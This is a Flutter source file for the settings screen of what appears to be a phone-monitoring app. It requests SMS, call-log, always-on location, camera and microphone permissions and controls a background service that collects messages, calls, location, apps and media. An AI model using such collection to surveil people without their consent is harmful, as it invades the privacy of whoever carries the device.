import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:monitored_app/app/locator.dart';
import 'package:monitored_app/core/services/background_service.dart';
import 'package:monitored_app/core/services/data_collector_service.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/collectors/sms_collector.dart';
import 'package:monitored_app/core/collectors/calls_collector.dart';
import 'package:monitored_app/core/collectors/location_collector.dart';
import 'package:monitored_app/core/collectors/apps_collector.dart';
import 'package:monitored_app/core/collectors/media_collector.dart';
import 'package:monitored_app/core/utils/media_permission_utils.dart';
import 'package:permission_handler/permission_handler.dart';

class SettingsScreen extends ConsumerStatefulWidget {
  const SettingsScreen({super.key});

  @override
  ConsumerState<SettingsScreen> createState() => _SettingsScreenState();
}

class _SettingsScreenState extends ConsumerState<SettingsScreen> {
  final StorageService _storageService = locator<StorageService>();
  final DataCollectorService _dataCollectorService =
      locator<DataCollectorService>();
  final BackgroundService _backgroundService = locator<BackgroundService>();

  // Collectors for permission management
  final SmsCollector _smsCollector = SmsCollector();
  final CallsCollector _callsCollector = CallsCollector();
  final LocationCollector _locationCollector = LocationCollector();
  final AppsCollector _appsCollector = AppsCollector();
  final MediaCollector _mediaCollector = MediaCollector();

  // Settings state
  bool _isBackgroundServiceEnabled = false;
  bool _isBatteryOptimizationEnabled = true;
  int _locationInterval = 900; // 15 minutes
  Map<String, bool> _permissionStatus = {};
  Map<String, dynamic> _collectorStats = {};

  @override
  void initState() {
    super.initState();
    _loadSettings();
    _checkPermissions();
    _loadCollectorStats();
  }

  Future<void> _loadSettings() async {
    try {
      final isServiceEnabled = await _backgroundService.isServiceRunning();
      final isBatteryOptEnabled =
          _storageService.getBool('battery_optimization_enabled') ?? true;
      final locationInterval =
          _storageService.getInt('location_interval_seconds') ?? 900;

      if (mounted) {
        setState(() {
          _isBackgroundServiceEnabled = isServiceEnabled;
          _isBatteryOptimizationEnabled = isBatteryOptEnabled;
          _locationInterval = locationInterval;
        });
      }
    } catch (e) {
      debugPrint('Error loading settings: $e');
    }
  }

  Future<void> _checkPermissions() async {
    try {
      final Map<String, bool> permissionStatus = {};

      // Check SMS permissions
      final smsPermission = await Permission.sms.status;
      permissionStatus['SMS'] = smsPermission.isGranted;

      // Check call log permissions
      final callLogPermission = await Permission.phone.status;
      permissionStatus['Call Log'] = callLogPermission.isGranted;

      // Check location permissions
      final locationPermission = await Permission.locationAlways.status;
      permissionStatus['Location'] = locationPermission.isGranted;

      // Check camera permissions
      final cameraPermission = await Permission.camera.status;
      permissionStatus['Camera'] = cameraPermission.isGranted;

      // Check microphone permissions
      final microphonePermission = await Permission.microphone.status;
      permissionStatus['Microphone'] = microphonePermission.isGranted;

      // Check media read permissions
      permissionStatus['Storage'] =
          await MediaPermissionUtils.hasAnyReadAccess();

      // Check notification permissions (Android 13+)
      final notificationPermission = await Permission.notification.status;
      permissionStatus['Notifications'] = notificationPermission.isGranted;

      if (mounted) {
        setState(() {
          _permissionStatus = permissionStatus;
        });
      }
    } catch (e) {
      debugPrint('Error checking permissions: $e');
    }
  }

  Future<void> _loadCollectorStats() async {
    try {
      final Map<String, dynamic> stats = {};

      // Get statistics from each collector
      stats['SMS'] = _smsCollector.getStatistics();
      stats['Calls'] = _callsCollector.getStatistics();
      stats['Location'] = _locationCollector.getStatistics();
      stats['Apps'] = _appsCollector.getStatistics();
      stats['Media'] = _mediaCollector.getStatistics();

      if (mounted) {
        setState(() {
          _collectorStats = stats;
        });
      }
    } catch (e) {
      debugPrint('Error loading collector stats: $e');
    }
  }

  Future<void> _requestPermission(String permissionName) async {
    try {
      Permission? permission;

      switch (permissionName) {
        case 'SMS':
          permission = Permission.sms;
          break;
        case 'Call Log':
          permission = Permission.phone;
          break;
        case 'Location':
          permission = Permission.locationAlways;
          break;
        case 'Camera':
          permission = Permission.camera;
          break;
        case 'Microphone':
          permission = Permission.microphone;
          break;
        case 'Storage':
          final granted = await _dataCollectorService.mediaStoreCollector
              .requestReadPermissions();
          if (mounted) {
            setState(() {
              _permissionStatus[permissionName] = granted;
            });
          }
          if (granted) {
            await _dataCollectorService.mediaStoreCollector.startCollecting();
          }
          return;
        case 'Notifications':
          permission = Permission.notification;
          break;
      }

      if (permission != null) {
        final status = await permission.request();

        if (mounted) {
          setState(() {
            _permissionStatus[permissionName] = status.isGranted;
          });
        }

        if (status.isPermanentlyDenied) {
          _showPermissionDialog(permissionName);
        }
      }
    } catch (e) {
      debugPrint('Error requesting permission for $permissionName: $e');
    }
  }

  void _showPermissionDialog(String permissionName) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Permission Required'),
        content: Text(
          'The $permissionName permission is required for monitoring functionality. '
          'Please grant this permission in the app settings.',
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: Text('Cancel'),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.of(context).pop();
              openAppSettings();
            },
            child: Text('Open Settings'),
          ),
        ],
      ),
    );
  }

  Future<void> _toggleBackgroundService(bool enabled) async {
    try {
      if (enabled) {
        await _backgroundService.startService();
      } else {
        await _backgroundService.stopService();
      }

      setState(() {
        _isBackgroundServiceEnabled = enabled;
      });

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(
            enabled
                ? 'Background service started'
                : 'Background service stopped',
          ),
        ),
      );
    } catch (e) {
      debugPrint('Error toggling background service: $e');
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text('Error: ${e.toString()}'),
          backgroundColor: Colors.red,
        ),
      );
    }
  }

  Future<void> _updateLocationInterval(int intervalSeconds) async {
    try {
      await _storageService.setInt(
          'location_interval_seconds', intervalSeconds);
      await _locationCollector.updateLocationInterval(intervalSeconds);

      setState(() {
        _locationInterval = intervalSeconds;
      });

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(
              'Location interval updated to ${intervalSeconds ~/ 60} minutes'),
        ),
      );
    } catch (e) {
      debugPrint('Error updating location interval: $e');
    }
  }

  Future<void> _toggleBatteryOptimization(bool enabled) async {
    try {
      await _storageService.setBool('battery_optimization_enabled', enabled);

      setState(() {
        _isBatteryOptimizationEnabled = enabled;
      });

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(
            enabled
                ? 'Battery optimization enabled'
                : 'Battery optimization disabled',
          ),
        ),
      );
    } catch (e) {
      debugPrint('Error toggling battery optimization: $e');
    }
  }

  Future<void> _clearCollectorCache() async {
    try {
      await _smsCollector.clearCache();
      await _callsCollector.clearCache();
      await _locationCollector.clearCache();
      await _appsCollector.clearCache();
      await _mediaCollector.clearCache();

      await _loadCollectorStats();

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Collector cache cleared')),
      );
    } catch (e) {
      debugPrint('Error clearing collector cache: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Settings'),
        backgroundColor: Colors.blue,
        foregroundColor: Colors.white,
      ),
      body: RefreshIndicator(
        onRefresh: () async {
          await _loadSettings();
          await _checkPermissions();
          await _loadCollectorStats();
        },
        child: ListView(
          padding: EdgeInsets.all(16),
          children: [
            // Service Control Section
            _buildSectionHeader('Service Control'),
            Card(
              child: Column(
                children: [
                  SwitchListTile(
                    title: Text('Background Service'),
                    subtitle: Text(_isBackgroundServiceEnabled
                        ? 'Monitoring is active'
                        : 'Monitoring is inactive'),
                    value: _isBackgroundServiceEnabled,
                    onChanged: _toggleBackgroundService,
                  ),
                  SwitchListTile(
                    title: Text('Battery Optimization'),
                    subtitle: Text(
                        'Automatically adjust collection frequency based on battery level'),
                    value: _isBatteryOptimizationEnabled,
                    onChanged: _toggleBatteryOptimization,
                  ),
                ],
              ),
            ),

            SizedBox(height: 16),

            // Collection Settings Section
            _buildSectionHeader('Collection Settings'),
            Card(
              child: Column(
                children: [
                  ListTile(
                    title: Text('Location Interval'),
                    subtitle: Text('${_locationInterval ~/ 60} minutes'),
                    trailing: DropdownButton<int>(
                      value: _locationInterval,
                      items: [
                        DropdownMenuItem(value: 300, child: Text('5 min')),
                        DropdownMenuItem(value: 600, child: Text('10 min')),
                        DropdownMenuItem(value: 900, child: Text('15 min')),
                        DropdownMenuItem(value: 1800, child: Text('30 min')),
                        DropdownMenuItem(value: 3600, child: Text('60 min')),
                      ],
                      onChanged: (value) {
                        if (value != null) {
                          _updateLocationInterval(value);
                        }
                      },
                    ),
                  ),
                  ListTile(
                    title: Text('Clear Cache'),
                    subtitle: Text('Clear all cached collector data'),
                    trailing: ElevatedButton(
                      onPressed: _clearCollectorCache,
                      child: Text('Clear'),
                    ),
                  ),
                ],
              ),
            ),

            SizedBox(height: 16),

            // Permissions Section
            _buildSectionHeader('Permissions'),
            Card(
              child: Column(
                children: _permissionStatus.entries.map((entry) {
                  final permissionName = entry.key;
                  final isGranted = entry.value;

                  return ListTile(
                    title: Text(permissionName),
                    subtitle: Text(isGranted ? 'Granted' : 'Not granted'),
                    trailing: isGranted
                        ? Icon(Icons.check_circle, color: Colors.green)
                        : ElevatedButton(
                            onPressed: () => _requestPermission(permissionName),
                            child: Text('Request'),
                          ),
                  );
                }).toList(),
              ),
            ),

            SizedBox(height: 16),

            // Collector Statistics Section
            _buildSectionHeader('Collector Statistics'),
            ..._collectorStats.entries.map((entry) {
              final collectorName = entry.key;
              final stats = entry.value as Map<String, dynamic>;

              return Card(
                child: ExpansionTile(
                  title: Text(collectorName),
                  subtitle: Text(
                      'Status: ${stats['is_collecting'] == true ? 'Active' : 'Inactive'}'),
                  children: [
                    Padding(
                      padding: EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text('Data Type: ${stats['data_type'] ?? 'Unknown'}'),
                          SizedBox(height: 4),
                          Text('Cached Items: ${stats['cached_items'] ?? 0}'),
                          SizedBox(height: 4),
                          Text(
                              'Interval: ${stats['collection_interval_seconds'] ?? 0}s'),
                          SizedBox(height: 4),
                          Text(
                              'Initialized: ${stats['is_initialized'] == true ? 'Yes' : 'No'}'),
                        ],
                      ),
                    ),
                  ],
                ),
              );
            }).toList(),
          ],
        ),
      ),
    );
  }

  Widget _buildSectionHeader(String title) {
    return Padding(
      padding: EdgeInsets.only(bottom: 8),
      child: Text(
        title,
        style: Theme.of(context).textTheme.titleLarge?.copyWith(
              fontWeight: FontWeight.bold,
              color: Colors.blue,
            ),
      ),
    );
  }
}
